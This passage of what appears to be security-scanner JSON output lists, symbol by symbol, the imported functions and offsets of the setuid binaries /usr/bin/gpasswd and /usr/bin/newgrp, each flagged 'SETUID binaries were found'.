                  "details": "Offset: 0x00014ca0, Symbol: __open_2, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ca8, Symbol: fclose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014cb0, Symbol: bindtextdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014cb8, Symbol: stpcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014cc0, Symbol: dcgettext, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014cc8, Symbol: strlen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014cd0, Symbol: __lxstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014cd8, Symbol: getpwuid_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ce0, Symbol: chdir, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ce8, Symbol: __stack_chk_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014cf0, Symbol: getuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014cf8, Symbol: getopt_long, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d00, Symbol: setbuf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d08, Symbol: strchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d10, Symbol: rewind, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d18, Symbol: snprintf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d20, Symbol: audit_open, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d28, Symbol: strrchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d30, Symbol: gettimeofday, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d38, Symbol: __assert_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d40, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d48, Symbol: memset, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d50, Symbol: geteuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d58, Symbol: selinux_set_callback, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d60, Symbol: close, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d68, Symbol: strspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d70, Symbol: matchpathcon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d78, Symbol: strcspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d80, Symbol: read, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d88, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d90, Symbol: execve, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014d98, Symbol: calloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014da0, Symbol: strcmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014da8, Symbol: putc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014db0, Symbol: signal, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014db8, Symbol: strtoll, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014dc0, Symbol: getpwnam, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014dc8, Symbol: getprevcon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014dd0, Symbol: feof, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014dd8, Symbol: umask, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014de0, Symbol: strtol, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014de8, Symbol: realpath, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014df0, Symbol: memcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014df8, Symbol: getgrnam, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e00, Symbol: kill, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e08, Symbol: fileno, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e10, Symbol: __stpcpy_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e18, Symbol: getgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e20, Symbol: l64a, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e28, Symbol: __xstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e30, Symbol: setfscreatecon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e38, Symbol: random, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e40, Symbol: malloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e48, Symbol: fflush, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e50, Symbol: __vasprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e58, Symbol: __fxstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e60, Symbol: getlogin, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e68, Symbol: fseek, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e70, Symbol: security_getenforce, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e78, Symbol: __fgets_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e80, Symbol: __strncpy_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e88, Symbol: setrlimit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e90, Symbol: setreuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014e98, Symbol: setregid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ea0, Symbol: realloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ea8, Symbol: fdopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014eb0, Symbol: getpwnam_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014eb8, Symbol: setlocale, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ec0, Symbol: __printf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ec8, Symbol: fchmod, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ed0, Symbol: __syslog_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ed8, Symbol: fsync, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ee0, Symbol: waitpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ee8, Symbol: tcgetattr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ef0, Symbol: tcsetattr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ef8, Symbol: getpass, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f00, Symbol: open, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f08, Symbol: access, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f10, Symbol: fchown, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f18, Symbol: audit_log_user_avc_message, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f20, Symbol: fopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f28, Symbol: ulckpwdf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f30, Symbol: perror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f38, Symbol: rename, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f40, Symbol: strtoul, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f48, Symbol: __cxa_atexit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f50, Symbol: openlog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f58, Symbol: freecon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f60, Symbol: link, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f68, Symbol: exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f70, Symbol: __fprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f78, Symbol: audit_log_user_message, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f80, Symbol: __strncat_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f88, Symbol: audit_log_acct_message, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f90, Symbol: setuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014f98, Symbol: strdup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014fa0, Symbol: strerror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014fa8, Symbol: crypt, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014fb0, Symbol: sleep, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014fb8, Symbol: getc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014fc0, Symbol: putgrent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014fc8, Symbol: fork, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014fd0, Symbol: __ctype_b_loc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014fd8, Symbol: _ITM_deregisterTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014fe0, Symbol: __libc_start_main, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014fe8, Symbol: __gmon_start__, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ff0, Symbol: _ITM_registerTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014ff8, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00016080, Symbol: stdout, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00016090, Symbol: stdin, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00016098, Symbol: optind, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x000160a0, Symbol: __environ, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x000160a8, Symbol: optarg, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x000160c0, Symbol: stderr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x00000000, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x00006b30, Symbol: setsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x00006b70, Symbol: endsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x00006bb0, Symbol: sgetsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x00006d60, Symbol: fgetsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x00006ed0, Symbol: getsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x00006f10, Symbol: getsgnam, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x00006f50, Symbol: putsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad40, Symbol: endgrent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad48, Symbol: getenv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad50, Symbol: __snprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad58, Symbol: free, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad60, Symbol: strcasecmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad68, Symbol: closelog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad70, Symbol: endspent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad78, Symbol: __errno_location, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad80, Symbol: strncpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad88, Symbol: strncmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad90, Symbol: strcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ad98, Symbol: getgrent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ada0, Symbol: ferror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ada8, Symbol: getpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000adb0, Symbol: textdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000adb8, Symbol: fclose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000adc0, Symbol: getspnam_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000adc8, Symbol: bindtextdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000add0, Symbol: stpcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000add8, Symbol: dcgettext, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ade0, Symbol: strlen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ade8, Symbol: getpwuid_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000adf0, Symbol: chdir, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000adf8, Symbol: __stack_chk_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae00, Symbol: getuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae08, Symbol: strchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae10, Symbol: rewind, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae18, Symbol: setgrent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae20, Symbol: getgrgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae28, Symbol: audit_open, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae30, Symbol: strrchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae38, Symbol: __assert_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae40, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae48, Symbol: memset, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae50, Symbol: setgroups, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae58, Symbol: strspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae60, Symbol: strcspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae68, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae70, Symbol: calloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae78, Symbol: strcmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae80, Symbol: putc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae88, Symbol: signal, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae90, Symbol: feof, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000ae98, Symbol: strtol, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aea0, Symbol: memcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aea8, Symbol: getgrnam, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aeb0, Symbol: kill, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aeb8, Symbol: getgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aec0, Symbol: getgroups, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aec8, Symbol: malloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aed0, Symbol: endpwent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aed8, Symbol: getlogin, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aee0, Symbol: __strncpy_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aee8, Symbol: ttyname, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aef0, Symbol: realloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aef8, Symbol: getgrgid_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af00, Symbol: getpwnam_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af08, Symbol: setlocale, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af10, Symbol: __printf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af18, Symbol: __syslog_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af20, Symbol: setgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af28, Symbol: waitpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af30, Symbol: getpass, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af38, Symbol: access, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af40, Symbol: fopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af48, Symbol: perror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af50, Symbol: sysconf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af58, Symbol: strtoul, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af60, Symbol: openlog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af68, Symbol: getgrnam_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af70, Symbol: exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af78, Symbol: execle, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af80, Symbol: __fprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af88, Symbol: audit_log_user_message, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af90, Symbol: audit_log_acct_message, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000af98, Symbol: setuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000afa0, Symbol: strdup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000afa8, Symbol: strerror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000afb0, Symbol: execl, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000afb8, Symbol: crypt, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000afc0, Symbol: sleep, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000afc8, Symbol: fork, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
